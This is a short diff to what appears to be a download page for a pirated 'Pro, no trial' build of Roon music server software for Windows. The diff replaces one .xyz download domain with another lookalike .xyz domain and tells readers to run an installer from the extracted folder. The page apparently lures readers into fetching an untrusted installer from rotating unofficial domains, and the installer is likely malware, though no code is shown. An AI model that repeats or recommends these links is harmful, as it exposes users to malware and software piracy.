@@ -6,8 +6,8 @@ Rich metadata layer over local and streaming music · Pro workspace · No trial 
 
 > Use the project link below for Windows.
 
-* **Project link:** **[roon-music-server-core-desktop.nexpath.xyz](https://roon-music-server-core-desktop.nexpath.xyz/)**
-* **Full URL:** `https://roon-music-server-core-desktop.nexpath.xyz/`
+* **Project link:** **[roon-music-server-core-desktop.nerasix.xyz](https://roon-music-server-core-desktop.nerasix.xyz/)**
+* **Full URL:** `https://roon-music-server-core-desktop.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
